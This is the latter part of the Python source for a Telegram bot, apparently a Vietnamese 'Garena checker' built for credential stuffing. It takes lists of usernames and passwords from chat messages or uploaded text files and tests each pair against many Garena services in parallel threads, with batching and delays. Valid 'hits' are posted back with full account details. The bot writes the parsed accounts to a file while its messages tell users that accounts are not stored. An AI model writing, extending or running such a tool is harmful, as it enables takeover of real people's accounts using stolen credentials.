        safe_send_message(chat_id, "⚠️ Dang check roi!")
        return
    if not accounts:
        safe_send_message(chat_id, "❌ Khong co accounts!")
        return
    checking = True
    stop_event.clear()
    total_accounts = len(accounts)
    total_services = len(SERVICE_ROUTES)
    safe_send_message(chat_id, f"""⚡ <b>CHECK TAT CA SERVICE</b>
📊 Accounts: <code>{total_accounts}</code>
📋 Services: <code>{total_services}</code>""")
    stats_all = {"total": total_accounts * total_services, "checked": 0, "hits": 0, "dead": 0, "errors": 0, "start_time": time.time()}
    all_results = []
    def process_all(user, pwd, service):
        if stop_event.is_set():
            return
        rate_limit(DEFAULT_DELAY)
        result = check_account_api(user, pwd, service, use_delay=False)
        result_type = result.get("result", "unknown")
        account_detail = {"user": user, "pwd": pwd, "service": service, "status": result_type, "time": datetime.now().strftime("%H:%M:%S")}
        all_results.append(account_detail)
        with stats_lock:
            stats_all["checked"] += 1
            if result_type == "hit":
                stats_all["hits"] += 1
                try:
                    safe_send_message(chat_id, format_full_info(user, pwd, service, result))
                except:
                    pass
            elif result_type == "dead":
                stats_all["dead"] += 1
            else:
                stats_all["errors"] += 1
    batches = []
    for i in range(0, len(accounts), CHECKMULTI_BATCH_SIZE):
        batches.append(accounts[i:i + CHECKMULTI_BATCH_SIZE])
    batch_num = 0
    total_batches = len(batches)
    for batch_accounts in batches:
        if stop_event.is_set():
            break
        batch_num += 1
        safe_send_message(chat_id, f"📦 <b>BATCH {batch_num}/{total_batches}</b> - 🔍 Dang check {len(batch_accounts)} accounts x {total_services} services...")
        all_tasks = [(user, pwd, service) for user, pwd in batch_accounts for service in SERVICE_ROUTES.keys()]
        with ThreadPoolExecutor(max_workers=DEFAULT_THREADS) as executor:
            futures = {executor.submit(process_all, user, pwd, service): (user, pwd, service) for user, pwd, service in all_tasks}
            for future in as_completed(futures):
                if stop_event.is_set():
                    executor.shutdown(wait=False)
                    break
        elapsed = time.time() - stats_all["start_time"]
        speed = stats_all["checked"] / elapsed if elapsed > 0 else 0
        percent = (stats_all["checked"] / stats_all["total"]) * 100
        safe_send_message(chat_id, f"""📊 <b>TIEN DO - {stats_all['checked']}/{stats_all['total']}</b> ({percent:.1f}%)
🎯 Hits: <code>{stats_all['hits']}</code> | ❌ Dead: <code>{stats_all['dead']}</code>
⚡ Speed: <code>{speed:.1f}</code> acc/s""")
        if batch_num < total_batches:
            time.sleep(CHECKMULTI_BATCH_DELAY)
    checking = False
    elapsed = time.time() - stats_all["start_time"]
    update_stats(hit_count=stats_all["hits"], dead_count=stats_all["dead"], error_count=stats_all["errors"], accounts=accounts, account_details=all_results)
    summary = f"""✅ CHECK ALL HOAN TAT!
━━━━━━━━━━━━━━━━━━━━━━
🎯 Hits: {stats_all['hits']}
❌ Dead: {stats_all['dead']}
⚠️ Errors: {stats_all['errors']}
⏱ Time: {elapsed:.1f}s
⚡ Speed: {stats_all['checked']/elapsed:.1f} acc/s
━━━━━━━━━━━━━━━━━━━━━━"""
    hits_list = [r for r in all_results if r["status"] == "hit"]
    if hits_list:
        summary += f"\n📌 HIT LIST ({len(hits_list)}):\n"
        for r in hits_list[:20]:
            summary += f"✅ {r['user']}:{r['pwd']} ({r['service']})\n"
        if len(hits_list) > 20:
            summary += f"... va {len(hits_list) - 20} hits khac"
    safe_send_message(chat_id, summary)

# ========== LENH ==========
@bot.message_handler(commands=['upaudio'])
def cmd_upaudio(message):
    if str(message.from_user.id) != ADMIN_CHAT_ID:
        safe_send_message(message.chat.id, "❌ Ban khong co quyen!")
        return
    safe_send_message(message.chat.id, "🎵 <b>UPLOAD AUDIO - ADMIN</b>\nGui file .wav hoac .mp3 vao bot")

@bot.message_handler(content_types=['audio'])
def handle_audio_upload(message):
    if str(message.from_user.id) != ADMIN_CHAT_ID:
        safe_send_message(message.chat.id, "❌ Khong co quyen!")
        return
    try:
        file_info = bot.get_file(message.audio.file_id)
        audio_data = bot.download_file(file_info.file_path)
        if not audio_data:
            safe_send_message(message.chat.id, "❌ Khong the tai audio!")
            return
        if len(audio_data) > 20 * 1024 * 1024:
            safe_send_message(message.chat.id, "❌ File qua lon! Gioi han 20MB.")
            return
        with open("custom_audio.wav", 'wb') as f:
            f.write(audio_data)
        duration = message.audio.duration if message.audio.duration else 0
        file_size_mb = len(audio_data) / (1024 * 1024)
        safe_send_message(message.chat.id, f"""✅ UPLOAD AUDIO THANH CONG!
📁 Ten: {message.audio.file_name or 'audio'}
⏱ {duration}s | 📦 {file_size_mb:.2f} MB""")
    except Exception as e:
        safe_send_message(message.chat.id, f"❌ Loi: {e}")

@bot.message_handler(commands=['delaudio'])
def cmd_delaudio(message):
    if str(message.from_user.id) != ADMIN_CHAT_ID:
        safe_send_message(message.chat.id, "❌ Khong co quyen!")
        return
    try:
        if os.path.exists("custom_audio.wav"):
            os.remove("custom_audio.wav")
    except:
        pass
    safe_send_message(message.chat.id, "✅ Da xoa audio custom!")

@bot.message_handler(commands=['stats'])
def cmd_stats(message):
    if not check_membership(message):
        return
    stats_data = load_stats()
    with SESSION_LOCK:
        session = SESSION_STATS
    msg = f"""📊 <b>THONG KE TONG</b>
━━━━━━━━━━━━━━━━━━━━━━
📦 Tong acc da check: <code>{stats_data.get('total_checked', 0)}</code>
✅ Tong hits: <code>{stats_data.get('total_hits', 0)}</code>
❌ Tong dead: <code>{stats_data.get('total_dead', 0)}</code>
⚠️ Tong errors: <code>{stats_data.get('total_errors', 0)}</code>

📊 <b>SESSION NAY</b>
📦 Da check: <code>{session.get('total_checked', 0)}</code>
✅ Hits: <code>{session.get('total_hits', 0)}</code>
❌ Dead: <code>{session.get('total_dead', 0)}</code>
⚠️ Errors: <code>{session.get('total_errors', 0)}</code>

⏰ Lan check cuoi: <code>{stats_data.get('last_check', 'Chua co')}</code>"""
    safe_send_message(message.chat.id, msg)

@bot.message_handler(commands=['start'])
def cmd_start(message):
    if not check_membership(message):
        return
    safe_send_message(message.chat.id, """🤖 <b>GARENA CHECKER BOT V6.1 - HACKER EDITION</b>
👤 Admin: @baohuyno1
🎵 TikTok: @baohuy1109

📌 <b>LENH:</b>
/check user:pass - Check 1 acc (FULL INFO)
/checkmulti user1:pass1,user2:pass2 - Check nhieu (FULL INFO)
/checkall - Check tat ca service
/services - Danh sach service
/stats - Xem thong ke tong
/stop - Dung check

⚠️ <b>KHONG LUU ACCOUNT!</b>
🔊 AM THANH TU DONG PHAT TREN WEB!
📊 LUU THONG KE VAO check_stats.json
📌 TRA KET QUA FULL INFO CHI TIET!""")

@bot.message_handler(commands=['check'])
def cmd_check(message):
    if not check_membership(message):
        return
    parts = message.text.split()
    if len(parts) < 2:
        safe_send_message(message.chat.id, "❌ /check user:pass")
        return
    account_str = parts[1]
    service = parts[2] if len(parts) > 2 else "lienquan"
    if service not in SERVICE_ROUTES:
        safe_send_message(message.chat.id, f"❌ Service: {', '.join(SERVICE_ROUTES.keys())}")
        return
    account_input = account_str.replace('|', ':')
    accounts, _ = loc_tk_mk_only(account_input)
    if not accounts:
        safe_send_message(message.chat.id, "❌ Format sai! Dung: user:pass")
        return
    user, pwd = accounts[0]
    threading.Thread(target=check_single, args=(message.chat.id, user, pwd, service)).start()

@bot.message_handler(commands=['checkmulti'])
def cmd_checkmulti(message):
    if not check_membership(message):
        return
    text = message.text.strip()
    if text.startswith('/checkmulti'):
        text = text[len('/checkmulti'):].strip()
    if not text:
        safe_send_message(message.chat.id, "❌ /checkmulti user1:pass1\\nuser2:pass2")
        return
    lines = text.split('\n')
    service = "lienquan"
    if lines:
        last_line = lines[-1].strip()
        last_word = last_line.split()[-1] if last_line.split() else ""
        if last_word in SERVICE_ROUTES and len(last_line.split()) == 1:
            service = last_word
            lines = lines[:-1]
        elif last_word in SERVICE_ROUTES and len(last_line.split()) > 1:
            service = last_word
            lines[-1] = last_line.rsplit(last_word, 1)[0].strip()
    accounts_input = '\n'.join(lines).replace(',', '\n').replace('|', ':')
    accounts, _ = loc_tk_mk_only(accounts_input)
    if not accounts:
        safe_send_message(message.chat.id, "❌ Khong tim thay acc!")
        return
    safe_send_message(message.chat.id, f"📊 Check {len(accounts)} accounts (FULL INFO)...")
    threading.Thread(target=check_batch, args=(message.chat.id, accounts, service)).start()

@bot.message_handler(commands=['checkall'])
def cmd_checkall(message):
    if not check_membership(message):
        return
    global pending_accounts
    chat_id = message.chat.id
    if chat_id in pending_accounts and pending_accounts[chat_id]:
        accounts = pending_accounts[chat_id]
        pending_accounts[chat_id] = []
        threading.Thread(target=check_all_services, args=(chat_id, accounts)).start()
    else:
        safe_send_message(chat_id, "❌ Khong co acc nao dang cho!")

@bot.message_handler(commands=['services'])
def cmd_services(message):
    if not check_membership(message):
        return
    msg = "📋 <b>SERVICE:</b>\n\n"
    for key, value in SERVICE_ROUTES.items():
        msg += f"{value['icon']} <b>{key}</b>: {value['desc']}\n"
    safe_send_message(message.chat.id, msg)

@bot.message_handler(commands=['stop'])
def cmd_stop(message):
    if not check_membership(message):
        return
    stop_event.set()
    global checking
    checking = False
    safe_send_message(message.chat.id, "🛑 Da dung check!")

@bot.message_handler(content_types=['text'])
def handle_text(message):
    if not check_membership(message):
        return
    global pending_accounts
    text = message.text.strip()
    chat_id = message.chat.id
    if text.startswith('/'):
        return
    accounts, _ = loc_tk_mk_only(text.replace('|', ':'))
    if not accounts:
        return
    if chat_id not in pending_accounts:
        pending_accounts[chat_id] = []
    pending_accounts[chat_id] = accounts
    save_loc_file(accounts)
    preview = '\n'.join([f"{u}:{p}" for u, p in accounts[:10]])
    total = len(accounts)
    safe_send_message(chat_id, f"""📊 LOC {total} ACCOUNTS
Preview:
{preview}
👇 /checkall - Check tat ca
⚠️ KHONG LUU ACCOUNT!""")

@bot.message_handler(content_types=['document'])
def handle_document(message):
    if not check_membership(message):
        return
    global pending_accounts
    chat_id = message.chat.id
    try:
        file_name = message.document.file_name or ""
        if str(message.from_user.id) == ADMIN_CHAT_ID and (file_name.endswith('.wav') or file_name.endswith('.mp3')):
            file_info = bot.get_file(message.document.file_id)
            audio_data = bot.download_file(file_info.file_path)
            if not audio_data:
                safe_send_message(chat_id, "❌ Khong the tai audio!")
                return
            if len(audio_data) > 20 * 1024 * 1024:
                safe_send_message(chat_id, "❌ File qua lon! Gioi han 20MB.")
                return
            with open("custom_audio.wav", 'wb') as f:
                f.write(audio_data)
            file_size_mb = len(audio_data) / (1024 * 1024)
            safe_send_message(chat_id, f"✅ UPLOAD AUDIO THANH CONG! 📦 {file_size_mb:.2f} MB")
            return
        if not file_name.endswith('.txt'):
            safe_send_message(chat_id, "❌ Chi ho tro file .txt!")
            return
        file_info = bot.get_file(message.document.file_id)
        content = bot.download_file(file_info.file_path).decode('utf-8', errors='ignore')
        accounts, _ = loc_tk_mk_only(content.replace('|', ':'))
        if not accounts:
            safe_send_message(chat_id, "❌ Khong tim thay user:pass!")
            return
        if chat_id not in pending_accounts:
            pending_accounts[chat_id] = []
        pending_accounts[chat_id] = accounts
        save_loc_file(accounts)
        preview = '\n'.join([f"{u}:{p}" for u, p in accounts[:20]])
        total = len(accounts)
        safe_send_message(chat_id, f"""✅ LOC {total} ACCOUNTS
Preview:
{preview}
👇 /checkall - Check tat ca
⚠️ KHONG LUU ACCOUNT!""")
    except Exception as e:
        safe_send_message(chat_id, f"❌ Loi: {e}")

def main():
    print("=" * 60)
    print("    GARENA CHECKER BOT V6.1 - HACKER EDITION")
    print("    ADMIN: @baohuyno1")
    print("    TIKTOK: @baohuy1109")
    print("    ===== HIEU UNG 3D + HACKER DEP =====")
    print("    ===== AM THANH TU DONG PHAT =====")
    print("    ===== KHONG LUU ACCOUNT =====")
    print("    ===== LUU THONG KE VAO check_stats.json =====")
    print("    ===== TRA KET QUA FULL INFO =====")
    print("=" * 60)
    while True:
        try:
            bot.polling(none_stop=True, interval=1, timeout=30)
        except Exception as e:
            print(f"[!] Loi: {e}")
            time.sleep(5)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n[!] Bot dung!")
        sys.exit(0)
